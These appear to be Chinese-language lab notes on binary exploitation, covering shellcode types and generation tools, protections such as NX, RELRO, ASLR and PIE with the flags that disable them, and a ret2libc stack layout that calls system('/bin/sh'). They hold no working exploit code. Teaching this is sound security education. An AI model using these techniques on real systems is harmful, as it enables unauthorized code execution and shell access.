（一）ShellCode 概述

ShellCode 是一段利用软件漏洞而执行的代码，常用机器语言编写，用于获取目标系统的 Shell。ShellCode 按照执行位置分为本地 ShellCode（常用于提权）和远程 ShellCode（通过套接字为攻击者提供 Shell 访问）。根据连接方式不同，分为反向 Shell、正向 Shell 和套接字重用 Shell。

获取 ShellCode 的方式很多，主要包括：

  • 直接编写汇编代码
  • Pwntools 生成
  • 网上查找（如 shell-storm.org）
  • Metasploit (msfvenom) 生成
  • CobaltStrike 生成

保护机制 说明 编译选项
NX (栈不可执行) 栈和堆标记为不可执行，防注入代码 -z execstack / -z noexecstack

RELRO 重定位表只读保护 -z norelro / -z lazy / -z now

ASLR 级别：

  • 0：禁用
  • 1：保守随机化
  • 2：完全随机化（默认）

ASLR 与 PIE 组合效果：

NO PIE Full PIE
ASLR=0 代码、libc、堆、栈都不变 代码、libc、堆、栈都不变
ASLR=1 libc、栈会变；代码、堆不变 代码、libc、堆、栈都变；代码与堆相对偏移不变
ASLR=2 libc、栈、堆会变；代码不变 代码、libc、堆、栈都变；相对偏移也变

关键原理

当调用 system 函数时，[ebp+8] 位置的数据被当作函数的第一个参数。因此栈布局为：

  • a' * 0x14：覆盖 buf（16B）+ EBP（4B）
  • system_plt：覆盖返回地址，劫持 EIP
  • 'b' * 4：system 函数的返回地址（用不到，但占位）
  • binsh_addr：system 的参数，即 ebp+8 位置的数据

总结

本实验覆盖了二进制漏洞利用的两个核心阶段：

  1. ShellCode 编写：从 C 源码到汇编再到机器码，手工提取 execve("/bin/sh") 的 ShellCode，并掌握 Pwntools 自动生成方法
  2. ROP 攻击：通过 ret2text 利用程序内已有的后门函数，通过 ret2libc 利用 libc 中的 system 函数，核心在于控制 EIP 并合理布置栈上参数

保护机制的绕过（NX、Canary、PIE、ASLR、RELRO）是后续更深层次学习的重点。
